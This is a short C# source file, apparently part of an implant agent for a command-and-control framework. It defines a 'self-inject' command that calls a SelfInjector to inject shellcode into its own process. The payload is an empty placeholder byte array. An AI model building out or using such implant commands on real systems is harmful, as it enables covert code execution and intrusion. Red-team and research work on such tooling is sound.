using Internal;
using Models.Tasks;
using Extend;

namespace Tasks.Commands
{
    public class SelfInject : CerberusCommand
    {
        public override string Name => "self-inject";

        public override string Execute(MythicTask task)
        {
            var FileBytes = new byte[10];

            var injector = new SelfInjector();
            var success = injector.Inject(FileBytes);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
